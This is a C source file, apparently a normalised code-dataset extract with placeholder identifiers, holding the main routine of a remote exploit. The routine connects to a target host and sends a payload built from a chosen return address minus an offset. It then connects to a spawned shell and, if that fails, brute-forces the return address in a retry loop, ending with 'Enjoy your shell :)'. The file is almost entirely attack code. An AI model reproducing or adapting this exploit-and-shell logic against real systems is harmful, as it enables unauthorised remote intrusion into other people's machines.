
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


struct TYPE_4__ {int sin_port; int sin_addr; } ;
struct TYPE_6__ {size_t target; int offset; int wait; TYPE_1__ host; } ;
struct TYPE_5__ {int retaddr; char* name; } ;


 int VAR_0 ;
 int FUNC_0 () ;
 int VAR_1 ;
 int FUNC_1 (int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int,int) ;
 int FUNC_5 (int ) ;
 char* FUNC_6 (int ) ;
 int FUNC_7 (int) ;
 int FUNC_8 (int ) ;
 TYPE_3__ VAR_2 ;
 int FUNC_9 (int,char**) ;
 int FUNC_10 (char*,...) ;
 int VAR_3 ;
 int FUNC_11 (int) ;
 int FUNC_12 (int) ;
 int VAR_4 ;
 int FUNC_13 (int ) ;
 TYPE_2__* VAR_5 ;

int FUNC_14(int VAR_6, char **VAR_7)
{
  int VAR_8, VAR_9, VAR_10;

  FUNC_0();
  FUNC_9(VAR_6, VAR_7);
  VAR_8 = VAR_5[VAR_2.target].retaddr - VAR_2.offset;
  VAR_1 = 0;

 bruteforce:

  if (!VAR_1)
    {
      FUNC_10("[*] Connecting to %s:%d... ",
      FUNC_6(VAR_2.host.sin_addr), FUNC_8(VAR_2.host.sin_port));
      FUNC_5(VAR_4);
    }

  VAR_9 = FUNC_2(FUNC_8(VAR_2.host.sin_port));

  if (!VAR_1)
    {
      if (!VAR_9)
 {
   FUNC_10("failed.\n\n");
   FUNC_3(-1);
 }
      FUNC_10("success.\n");
    }

  FUNC_7(VAR_9);
  FUNC_4(VAR_9, VAR_8);
  FUNC_1(VAR_9);

  FUNC_10("[*] Target: %s - 0x%.8x\n", VAR_5[VAR_2.target].name, VAR_8);
  FUNC_10("[*] Exploit sent, spawning a shell... ");
  FUNC_5(VAR_4);

  FUNC_12(1);
  VAR_10 = FUNC_2(VAR_0);

  if (!VAR_10 && VAR_2.target)
    {
      FUNC_10("failed.\n\n");
      FUNC_3(-1);
    }
  if (!VAR_10)
    {
      FUNC_10("failed.\n\n");
      VAR_8 -= 1000 - FUNC_13(VAR_3);
      VAR_1 = 1;
      if (VAR_2.wait) FUNC_12(VAR_2.wait);
      goto bruteforce;
    }
  FUNC_10("success!\n\nEnjoy your shell :)\n\n");
  FUNC_11(VAR_10);

  return 0;
}
